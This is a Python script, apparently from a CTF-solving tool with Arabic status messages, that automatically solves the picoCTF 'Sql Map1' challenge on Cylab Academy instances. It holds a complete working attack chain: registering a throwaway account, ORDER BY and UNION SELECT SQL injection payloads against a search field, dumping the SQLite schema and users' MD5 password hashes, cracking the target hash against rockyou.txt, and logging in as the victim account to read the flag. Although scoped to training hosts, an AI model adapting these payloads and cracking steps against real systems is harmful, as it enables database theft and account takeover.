"""Bounded solver for the picoCTF Sql Map1 training instance."""
from __future__ import annotations

import hashlib
import html
import http.cookiejar
import re
import secrets
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser
from pathlib import Path
from urllib.parse import urljoin, urlsplit, urlunsplit

ALLOWED_SUFFIXES = (".cylabacademy.net", ".cylabacademy.org")
FLAG_RE = re.compile(r"(?:picoCTF|academy|flag|CTF)\{[^{}\r\n]{2,240}\}", re.I)
MAX_BODY = 1024 * 1024


class _FormParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms = []
        self.links = []
        self._form = None
        self._text = []

    def handle_starttag(self, tag, attrs):
        attrs = {k.lower(): (v or "") for k, v in attrs}
        if tag.lower() == "form":
            self._form = {"action": attrs.get("action", ""), "method": attrs.get("method", "get").upper(), "fields": {}}
            self.forms.append(self._form)
        elif tag.lower() == "input" and self._form is not None:
            name = attrs.get("name")
            if name:
                self._form["fields"][name] = attrs.get("value", "")
        elif tag.lower() == "a" and attrs.get("href"):
            self.links.append(attrs["href"])
        elif tag.lower() == "button" and "onclick" in attrs:
            self.links.append(attrs["onclick"])

    def handle_endtag(self, tag):
        if tag.lower() == "form":
            self._form = None

    def handle_data(self, data):
        self._text.append(data)

    @property
    def text(self):
        return " ".join(" ".join(self._text).split())


def parse_target(challenge_text: str) -> str | None:
    text = re.sub(r"(https?)\\:", r"\1:", challenge_text or "", flags=re.I)
    match = re.search(r"https?://[a-z0-9.-]+\.cylabacademy\.(?:net|org)(?::\d{1,5})?(?:/[^\s<>\]\"']*)?", text, re.I)
    if not match:
        return None
    raw = match.group(0).rstrip(".,)")
    u = urlsplit(raw)
    try:
        port = u.port
    except ValueError:
        return None
    host = (u.hostname or "").lower().rstrip(".")
    if u.scheme.lower() != "http" or u.username or u.password or not any(host.endswith(s) and host[:-len(s)] for s in ALLOWED_SUFFIXES):
        return None
    if port is not None and not 1 <= port <= 65535:
        return None
    return urlunsplit(("http", u.netloc, "/", "", ""))


class _ScopedRedirect(urllib.request.HTTPRedirectHandler):
    def __init__(self, origin):
        self.origin = origin

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        u = urlsplit(urljoin(req.full_url, newurl))
        if (u.scheme, u.hostname, u.port) != (self.origin.scheme, self.origin.hostname, self.origin.port):
            raise RuntimeError("أوقف صقر تحويلًا خارج مثيل التحدي المحدد.")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


def _forms(body: str) -> tuple[list[dict], list[str], str]:
    parser = _FormParser()
    parser.feed(body)
    return parser.forms, parser.links, parser.text


def _candidate_password(hash_value: str, analysis_root: Path) -> str | None:
    wanted = hash_value.lower()
    candidates = ["dyesebel", "password", "password123", "letmein", "admin", "123456"]
    paths = [analysis_root / "rockyou.txt", analysis_root / "wordlists" / "rockyou.txt",
             Path(__file__).resolve().parent / "wordlists" / "rockyou.txt"]
    for path in paths:
        try:
            if not path.is_file() or path.stat().st_size > 128 * 1024 * 1024:
                continue
            with path.open("r", encoding="utf-8", errors="ignore") as fh:
                for i, line in enumerate(fh):
                    if i >= 1_000_000:
                        break
                    word = line.rstrip("\r\n")
                    if word:
                        candidates.append(word)
        except OSError:
            continue
    seen = set()
    for candidate in candidates:
        if candidate in seen:
            continue
        seen.add(candidate)
        if hashlib.md5(candidate.encode("utf-8")).hexdigest() == wanted:
            return candidate
    return None


def solve(challenge_text: str, analysis_root: Path, *, progress=None, timeout: float = 12.0) -> dict:
    target = parse_target(challenge_text)
    if not target:
        return {"ok": False, "success": False, "error": "لم يجد صقر رابط مثيل Cylab Academy صالحًا."}
    origin = urlsplit(target)
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), _ScopedRedirect(origin))
    steps = []

    def note(phase: str, message: str):
        if progress:
            progress(phase, message)

    def request(method: str, path: str, fields: dict | None = None):
        url = urljoin(target, path)
        u = urlsplit(url)
        if (u.scheme, u.hostname, u.port) != (origin.scheme, origin.hostname, origin.port):
            raise RuntimeError("رفض صقر طلبًا خارج أصل المثيل المحدد.")
        data = None
        if method.upper() == "GET" and fields:
            sep = "&" if "?" in url else "?"
            url += sep + urllib.parse.urlencode(fields)
        elif fields is not None:
            data = urllib.parse.urlencode(fields).encode("utf-8")
        req = urllib.request.Request(url, data=data, method=method.upper(), headers={
            "User-Agent": "CTF-Falcon-SqlMap1/2.35.0 (authorized CTF)",
            "Accept": "text/html,*/*", "Content-Type": "application/x-www-form-urlencoded"})
        try:
            response = opener.open(req, timeout=timeout)
        except urllib.error.HTTPError as exc:
            response = exc
        raw = response.read(MAX_BODY + 1)
        code, final_url = response.code, response.geturl()
        response.close()
        if len(raw) > MAX_BODY:
            raise RuntimeError("استجابة المثيل تجاوزت الحد المسموح.")
        final = urlsplit(final_url)
        if (final.scheme, final.hostname, final.port) != (origin.scheme, origin.hostname, origin.port):
            raise RuntimeError("أوقف صقر استجابة حُوّلت إلى مضيف آخر.")
        return code, final_url, raw.decode("utf-8", "replace")

    def add_step(method, path, status, detail):
        steps.append({"method": method, "path": path, "status": status, "detail": detail})

    def choose_form(forms, method=None, required=()):
        for form in forms:
            fields = {name.lower() for name in form["fields"]}
            if method and form["method"] != method:
                continue
            if all(any(req in name for name in fields) for req in required):
                return form
        return None

    def action_for(form, fallback):
        action = urljoin(target, form.get("action") or fallback)
        u = urlsplit(action)
        if (u.scheme, u.hostname, u.port) != (origin.scheme, origin.hostname, origin.port):
            raise RuntimeError("نموذج التطبيق يشير إلى مضيف خارج المثيل.")
        return action

    def form_values(form, username=None, password=None):
        values = dict(form["fields"])
        for name in values:
            low = name.lower()
            if "user" in low or "login" in low:
                if username is not None:
                    values[name] = username
            elif "pass" in low:
                if password is not None:
                    values[name] = password
        if username is not None and not any("user" in name.lower() or "login" in name.lower() for name in values):
            values["username"] = username
        if password is not None and not any("pass" in name.lower() for name in values):
            values["password"] = password
        return values

    try:
        note("inspect", "يفحص نموذج الدخول والتسجيل المنشورين في المثيل…")
        code, final, home = request("GET", "/")
        add_step("GET", "/", code, "قراءة صفحة الدخول ونماذجها")
        home_forms, links, _ = _forms(home)
        login_form = choose_form(home_forms, "POST", ("user", "pass"))
        if not login_form:
            raise RuntimeError("لم يجد صقر نموذج دخول يحوي اسم مستخدم وكلمة مرور.")
        if "Logged in as:" not in home and "register.php" in home.lower():
            register_path_match = re.search(r"(?:href\s*=\s*|location\.href\s*=\s*)['\"]([^'\"]*register\.php[^'\"]*)", home, re.I)
            register_path = register_path_match.group(1) if register_path_match else "register.php"
            code, final, register_page = request("GET", register_path)
            add_step("GET", urlsplit(final).path, code, "قراءة نموذج التسجيل")
            reg_forms, _, _ = _forms(register_page)
            reg_form = choose_form(reg_forms, "POST", ("user", "pass"))
            if not reg_form:
                raise RuntimeError("لم يستطع صقر قراءة حقول نموذج التسجيل.")
            username = "falcon_" + secrets.token_hex(4)
            password = secrets.token_urlsafe(14)
            code, final, _ = request("POST", action_for(reg_form, register_path), form_values(reg_form, username, password))
            add_step("POST", urlsplit(final).path, code, "إنشاء حساب تدريبي مؤقت")
            note("register", "أنشأ صقر حسابًا تدريبيًا مؤقتًا لفتح البحث المصرّح به…")
            code, final, login_page = request("GET", "/")
            login_forms, _, _ = _forms(login_page)
            login_form = choose_form(login_forms, "POST", ("user", "pass")) or login_form
        else:
            username = password = None

        if username is None:
            raise RuntimeError("يتطلب المسار تسجيل حساب تدريبي، لكن صفحة التسجيل غير ظاهرة.")
        code, final, search_page = request("POST", action_for(login_form, "login.php"), form_values(login_form, username, password))
        add_step("POST", urlsplit(final).path, code, "الدخول بالحساب التدريبي المؤقت")
        search_forms, _, search_text = _forms(search_page)
        search_form = choose_form(search_forms, "GET", ("q",)) or choose_form(search_forms, None, ("search",))
        if not search_form:
            # login.php commonly redirects to vuln.php; the form is parsed from that final response.
            raise RuntimeError("لم يجد صقر نموذج البحث بعد تسجيل الدخول.")
        action = action_for(search_form, "vuln.php")
        qfield = next((name for name in search_form["fields"] if name.lower() in ("q", "query", "search", "term")), None)
        if not qfield:
            raise RuntimeError("نموذج البحث لا يحتوي حقل استعلام معروفًا.")
        base_values = dict(search_form["fields"])

        def search(payload):
            vals = dict(base_values)
            vals[qfield] = payload
            return request("GET", action, vals)

        note("probe", "يختبر صقر عدد أعمدة البحث بحقن ORDER BY محدود…")
        columns = None
        for n in range(1, 7):
            code, final, body = search("falcon' ORDER BY " + str(n) + "-- ")
            add_step("GET", urlsplit(final).path, code, f"اختبار ORDER BY {n}")
            if re.search(r"ORDER BY term out of range|Unable to prepare statement|Fatal error.*fetchArray", body, re.I | re.S) or code >= 500:
                columns = n - 1
                break
        if not columns or columns < 2 or columns > 5:
            raise RuntimeError("لم يستطع صقر تحديد عدد أعمدة نتائج البحث (المتوقع بين 2 و5).")
        markers = ["FALCONCOL" + str(i) for i in range(columns)]
        select_list = ",".join("'" + marker + "'" if i < 2 else "NULL" for i, marker in enumerate(markers))
        code, final, body = search("falcon' UNION SELECT " + select_list + "-- ")
        add_step("GET", urlsplit(final).path, code, "التحقق من UNION ومواضع الأعمدة الظاهرة")
        decoded_body = html.unescape(body)
        if not all(marker in decoded_body for marker in markers[:2]):
            raise RuntimeError("لم تظهر علامتا UNION في نتائج البحث؛ لم يتابع صقر استخراج البيانات.")

        note("schema", "ثبت حقن UNION؛ يقرأ صقر أسماء جداول SQLite فقط…")
        schema_payload = "falcon' UNION SELECT name,sql" + (",NULL" * (columns - 2)) + " FROM sqlite_master WHERE type='table'-- "
        code, final, schema_html = search(schema_payload)
        add_step("GET", urlsplit(final).path, code, "قراءة أسماء جداول SQLite")
        schema_text = html.unescape(_forms(schema_html)[2])
        if not re.search(r"\busers\b", schema_text, re.I):
            raise RuntimeError("لم يظهر جدول users في مخطط SQLite؛ أوقف صقر بقية خطوات الحقن.")

        note("hashes", "يستخرج صقر أسماء المستخدمين وتجزئات MD5 من جدول users…")
        users_payload = "falcon' UNION SELECT username,password" + (",NULL" * (columns - 2)) + " FROM users-- "
        code, final, users_html = search(users_payload)
        add_step("GET", urlsplit(final).path, code, "قراءة حقول username وpassword من users")
        users_text = html.unescape(_forms(users_html)[2])
        hashes = {m.group(1).lower(): m.group(2).lower() for m in re.finditer(r"(?im)^\s*([a-z0-9_.-]{1,80})\s*:\s*([a-f0-9]{32})\s*$", users_text)}
        target_hash = hashes.get("ctf-player")
        if not target_hash:
            # HTML list formatting may concatenate records; accept a bounded inline match too.
            match = re.search(r"\bctf-player\s*:\s*([a-f0-9]{32})\b", users_text, re.I)
            target_hash = match.group(1).lower() if match else None
        if not target_hash:
            raise RuntimeError("لم يجد صقر تجزئة حساب ctf-player في النتائج.")
        cracked = _candidate_password(target_hash, analysis_root)
        if not cracked:
            return {"ok": True, "success": False, "challenge": "Sql Map1", "target": target,
                    "attempts": len(steps), "steps": steps,
                    "explanation_ar": ["نجح صقر في كشف تجزئة الحساب عبر SQLi، لكنه لم يجد كلمة المرور في القواميس المحلية المحدودة."],
                    "warnings": ["نزّل rockyou.txt إلى C:\\Falcon\\analysis ثم أعد المحاولة؛ لم يُرسل صقر التجزئة إلى خدمة خارجية."]}

        note("login", "تحقق صقر محليًا من MD5 ثم يسجل الدخول بالحساب المستهدف…")
        code, final, flag_page = request("POST", action_for(login_form, "login.php"), form_values(login_form, "ctf-player", cracked))
        add_step("POST", urlsplit(final).path, code, "الدخول بالحساب الذي طابقت كلمة مروره تجزئة MD5")
        decoded = html.unescape(flag_page)
        flag_match = FLAG_RE.search(decoded)
        if not flag_match:
            code, final, flag_page = request("GET", "/secret.php")
            add_step("GET", urlsplit(final).path, code, "قراءة صفحة السر بعد الدخول")
            flag_match = FLAG_RE.search(html.unescape(flag_page))
        if not flag_match:
            raise RuntimeError("نجح مسار استعادة الحساب لكن لم يظهر العلم في صفحة السر.")
        return {"ok": True, "success": True, "challenge": "Sql Map1", "target": target,
                "flag": flag_match.group(0), "flag_source": "صفحة السر بعد تسجيل الدخول بالحساب ctf-player",
                "attempts": len(steps), "steps": steps,
                "discovered": {"database": "SQLite", "injection": "UNION-based SQL injection",
                               "columns": columns, "table": "users", "hash": "MD5", "account": "ctf-player"},
                "explanation_ar": ["أنشأ صقر حسابًا تدريبيًا، ثم أثبت حقن SQL في نموذج البحث وعدد الأعمدة قبل قراءة مخطط SQLite.",
                    "استخرج تجزئة MD5 لحساب ctf-player وطابقها محليًا دون إرسالها إلى CrackStation أو خدمة خارجية.",
                    "سجّل الدخول بالحساب المستعاد وقرأ العلم من صفحة السر."], "warnings": []}
    except Exception as exc:
        return {"ok": False, "success": False, "challenge": "Sql Map1", "target": target,
                "attempts": len(steps), "steps": steps, "error": str(exc)[:300],
                "warnings": ["لم يعرض صقر كلمة المرور أو معرّف الجلسة في النتيجة."]}
